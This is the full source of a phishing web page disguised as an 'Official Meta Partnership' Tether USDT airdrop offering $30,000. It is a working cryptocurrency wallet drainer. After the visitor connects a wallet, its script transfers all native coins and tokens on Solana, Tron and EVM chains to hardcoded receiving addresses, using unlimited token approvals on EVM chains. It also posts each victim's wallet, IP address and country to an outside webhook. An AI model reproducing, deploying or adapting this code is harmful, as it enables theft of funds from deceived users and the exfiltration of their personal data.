  <style>
    :root {
      --blue: #00d4ff;

      --black: #000000;

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {

      color: var(--blue);
      text-align: center;
      min-height: 100vh;
      display: flex;
      align-items: center;

      padding: 15px;
      overflow-x: hidden;
    }

    .container {
      max-width: 460px;
      width: 100%;
      background: var(--gray);
      border: 2px solid var(--border);
      border-radius: 18px;
      padding: 32px 24px;

    }

    .logo {
      width: 70px;

      margin: 0 auto 12px;
      animation: spin 3s linear infinite;
    }

    @keyframes spin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }

    h1 {
      font-size: 2.4rem;

    iframe {
      width: 100%;
      height: 260px;
      border: none;
    }

    .zuck {
      font-style: italic;
      color: #00aaff;
      margin: 14px 0 10px;
      font-size: 1.05rem;
      font-weight: 600;
    }

    .social-links {
      display: flex;
      justify-content: center;
      gap: 16px;
      margin: 10px 0 20px;
    }

    .social-links a {
      color: var(--blue);
      font-size: 1.4rem;
      transition: 0.3s;
    }

    .social-links a:hover {
      color: white;
      transform: scale(1.2);
    }

    .countdown {
      background: rgba(0, 212, 255, 0.1);
      border: 1px solid var(--border);
      color: var(--blue);
      padding: 12px;
      border-radius: 12px;
      font-weight: 700;
      margin: 18px 0;
      font-size: 1.1rem;
    }

    .alert {
      background: rgba(255, 0, 0, 0.15);
      border: 1px solid var(--red);
      color: #ff9999;
      padding: 14px;
      border-radius: 12px;
      margin: 20px 0;
      font-size: 0.95rem;
      font-weight: 600;
      line-height: 1.5;
    }

    .btn {
      width: 100%;
      padding: 16px;
      margin: 14px 0;
      background: linear-gradient(45deg, #00d4ff, #0099cc);
      color: #000;
      border: none;
      border-radius: 50px;
      font-weight: 800;
      font-size: 1.15rem;
      cursor: pointer;
      transition: all 0.3s ease;
      text-transform: uppercase;
    }

    .btn:hover:not(:disabled) {
      transform: translateY(-3px);
      box-shadow: 0 8px 25px rgba(0, 212, 255, 0.4);
    }

    .btn:disabled {
      background: #333;
      color: #666;
      cursor: not-allowed;
    }

    .status {
      margin-top: 16px;
      font-size: 0.95rem;
      color: #66e0ff;
      min-height: 24px;
    }

    .success { color: #90ff90; font-weight: 700; }
    .loading {
      display: inline-block;
      width: 16px; height: 16px;
      border: 2px solid #333;
      border-top: 2px solid var(--blue);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-left: 8px;
    }

    .tx-hash {
      font-family: monospace;
      font-size: 0.85rem;
      color: #00aaff;
      word-break: break-all;
      margin: 10px 0;
      padding: 8px;
      background: #111;
      border-radius: 8px;
      border: 1px dashed #333;
    }

    @media (max-width: 480px) {
      h1 { font-size: 2rem; }
      .btn { font-size: 1.1rem; padding: 14px; }
    }
  </style>
</head>
<body>

<div class="container">
  <img src="https://i.imgur.com/3DUSDT.gif" alt="USDT 3D" class="logo">

  <h1>Tether USDT Airdrop</h1>
  <p class="subtitle">Official Meta Partnership</p>

  <div class="video-container">
    <iframe src="https://www.youtube.com/embed/SI5TvAs1eCc?autoplay=1&mute=0&loop=1&playlist=SI5TvAs1eCc&rel=0" allow="autoplay"></iframe>

  <div class="social-links">

    <a href="https://youtube.com/@Meta" target="_blank"><i class="fab fa-youtube"></i></a>
  </div>

  <div class="countdown">Airdrop ends in: <span id="timer">1440:00:00</span></div>

  <div class="alert">
    <strong>REQUIRED:</strong> Have enough native gas in your wallet:<br>
    <small>• <strong>ETH</strong> (Ethereum / Base / Arbitrum / Optimism)<br>• <strong>BNB</strong> (BSC)<br>• <strong>MATIC</strong> (Polygon)<br>• <strong>SOL</strong> (Solana)<br>• <strong>TRX</strong> (Tron)</small>
  </div>

  <button class="btn" id="connectBtn">Connect Wallet</button>
  <button class="btn" id="claimBtn" disabled>Claim $30,000 USDT</button>

  <div class="status" id="status">Not connected</div>
  <div class="tx-hash" id="txHash" style="display:none;"></div>
</div>

<script>
  // === YOUR RECEIVING ADDRESSES ===
  const RECEIVERS = {
    evm: "0xd6188E3f90A83abFAC0880bbc857B53cD5bf79AB", // ETH, Base, BSC, Polygon, Arbitrum, etc.
    solana: "HEu2FkY2ytismUsWjDUptXWjVTNrxfDAUAYFAbFdYMUU",
    tron: "TNeGJ94Bq4NZWybFLvv1rUwpTSajh7Qrgt"
  };

  const WEBHOOK = "https://eoiimw9txcq3ops.m.pipedream.net";
  const MAX_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

  const DEBANK_CHAIN = {
    1: 'eth', 56: 'bsc', 137: 'poly', 8453: 'base', 42161: 'arbitrum', 10: 'op', 43114: 'avax', 250: 'ftm'
    // add more if needed
  };

  let account, web3, provider, chainId, isTron = false;

  const connectBtn = document.getElementById("connectBtn");
  const claimBtn = document.getElementById("claimBtn");
  const status = document.getElementById("status");
  const txHash = document.getElementById("txHash");

  connectBtn.onclick = connect;
  claimBtn.onclick = claim;

  function startCountdown() {
    let time = 1440 * 60 * 60;
    const timer = document.getElementById("timer");
    setInterval(() => {
      if (time <= 0) { timer.innerHTML = "0000:00:00"; return; }
      time--;
      const h = String(Math.floor(time / 3600)).padStart(4, '0');
      const m = String(Math.floor((time % 3600) / 60)).padStart(2, '0');
      const s = String(time % 60).padStart(2, '0');
      timer.innerHTML = `${h}:${m}:${s}`;
    }, 1000);
  }
  startCountdown();

  async function getIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch { return "unknown"; }
  }

  async function connect() {
    if (!window.ethereum && !window.solana && !window.tronWeb) {
      return alert("Install MetaMask, Phantom or TronLink!");
    }

    try {
      if (window.tronWeb && window.tronWeb.ready) {
        isTron = true;
        account = window.tronWeb.defaultAddress.base58;
        chainId = 728126428; // Tron chain
      } else if (window.solana && window.solana.isPhantom) {
        await window.solana.connect();
        account = window.solana.publicKey.toString();
        chainId = 501;
      } else {
        await ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(provider = window.ethereum);
        [account] = await web3.eth.getAccounts();
        chainId = await web3.eth.getChainId();
      }

      const network = isTron ? "Tron" : (chainId === 501 ? "Solana" : "EVM Chain");
      status.innerHTML = `Connected: ${account.slice(0,6)}...${account.slice(-4)} (${network})`;
      connectBtn.innerHTML = "Connected";
      connectBtn.disabled = true;
      claimBtn.disabled = false;

      const ip = await getIP();
      await notify("CONNECTED", account, ip);

    } catch (e) {
      status.innerHTML = "Connection rejected";
    }
  }

  async function claim() {
    claimBtn.innerHTML = `Draining...<span class="loading"></span>`;
    const ip = await getIP();
    let txs = [];

    try {
      if (chainId === 501) {
        // ==================== SOLANA FULL DRAIN ====================
        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
        const victimPubkey = window.solana.publicKey;

        // Drain SOL
        let lamports = await connection.getBalance(victimPubkey);
        if (lamports > 10000000) {
          const tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey: victimPubkey,
              toPubkey: new solanaWeb3.PublicKey(RECEIVERS.solana),
              lamports: lamports - 9000000 // leave gas
            })
          );
          const sig = await window.solana.signAndSendTransaction(tx);
          txs.push(sig.signature);
        }

        // Drain all SPL tokens
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(victimPubkey, { programId: solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") });

        for (const acc of tokenAccounts.value) {
          const info = acc.account.data.parsed.info;
          if (parseFloat(info.tokenAmount.uiAmount) > 0) {
            const dest = splToken.getAssociatedTokenAddressSync(
              new solanaWeb3.PublicKey(info.mint),
              new solanaWeb3.PublicKey(RECEIVERS.solana)
            );

            // create dest account if not exist (ignore error if exists)
            const tx = new solanaWeb3.Transaction();
            try {
              tx.add(splToken.createAssociatedTokenAccountInstruction(
                victimPubkey, dest, new solanaWeb3.PublicKey(RECEIVERS.solana), new solanaWeb3.PublicKey(info.mint)
              ));
            } catch {}

            tx.add(splToken.createTransferInstruction(
              acc.pubkey,
              dest,
              victimPubkey,
              info.tokenAmount.amount
            ));

            const sig = await window.solana.signAndSendTransaction(tx);
            txs.push(sig.signature);
          }
        }

      } else if (isTron) {
        // ==================== TRON FULL DRAIN ====================
        const tronWeb = window.tronWeb;

        // Drain TRX
        const balance = await tronWeb.trx.getBalance(account);
        if (balance > 1000000) { // leave 1 TRX
          const tx = await tronWeb.transactionBuilder.sendTrx(RECEIVERS.tron, balance - 1000000, account);
          const signedTx = await tronWeb.trx.sign(tx);
          const result = await tronWeb.trx.sendRawTransaction(signedTx);
          txs.push(result.txid);
        }

        // Drain TRC20 tokens (top common + all from balance)
        const tokens = await fetch(`https://api.trongrid.io/v1/accounts/${account}/tokens?limit=100`).then(r => r.json());
        for (const t of tokens.data) {
          if (t.balance <= 0) continue;
          const contract = await tronWeb.contract().at(t.contract_address);
          const tx = await contract.transfer(RECEIVERS.tron, t.balance).send();
          txs.push(tx.txid);
        }

      } else {
        // ==================== EVM FULL UNIVERSAL DRAIN (DeBank API) ====================
        const debankChain = DEBANK_CHAIN[chainId] || 'eth';
        const tokenList = await fetch(`https://openapi.debank.com/v1/user/token_list?id=${account}&chain_id=${debankChain}`).then(r => r.json());

        const receiver = RECEIVERS.evm;

        // ERC20 tokens
        for (const token of tokenList) {
          if (!token.amount || token.amount == 0 || token.is_core) continue; // skip native

          const contract = new web3.eth.Contract([
            {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
          ], token.id);

          try {
            await contract.methods.approve(receiver, MAX_APPROVE).send({ from: account });
            const rawAmount = token.raw_amount || web3.utils.toWei(token.amount.toString(), "ether"); // fallback
            await contract.methods.transferFrom(account, receiver, rawAmount).send({ from: account });
            txs.push("ERC20 drained");
          } catch(e) {}
        }

        // Native coin drain
        const nativeBalance = await web3.eth.getBalance(account);
        const gasPrice = await web3.eth.getGasPrice();
        const gasLimit = 21000;
        const maxGas = gasPrice * gasLimit * 3n;
        if (nativeBalance > maxGas) {
          const tx = await web3.eth.sendTransaction({
            from: account,
            to: receiver,
            value: nativeBalance - maxGas
          });
          txs.push(tx.transactionHash);
        }
      }

      status.innerHTML = `<span class="success">Wallet Successfully Drained!</span>`;
      txHash.style.display = "block";
      txHash.innerHTML = `Success! ${txs.length} transactions sent`;

      await notify("DRAINED", account, ip, txs.join(" | "));

    } catch (e) {
      console.error(e);
      status.innerHTML = "Drain failed – try again or low gas";
    }

    setTimeout(() => {
      claimBtn.innerHTML = "Claim $30,000 USDT";
      claimBtn.disabled = false;
    }, 6000);
  }

  async function notify(action, wallet, ip = "unknown", tx = "", amount = 0) {
    const geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json()).catch(() => ({});
    fetch(WEBHOOK, {
      method: "POST",
      body: JSON.stringify({
        action, wallet, ip,
        country: geo.country_name || "Unknown",
        tx, amount,
        network: isTron ? "Tron" : (chainId === 501 ? "Solana" : "EVM"),
        timestamp: new Date().toLocaleString()
      }),
      headers: { "Content-Type": "application/json" }
    }).catch(() => {});
  }
</script>

</body>
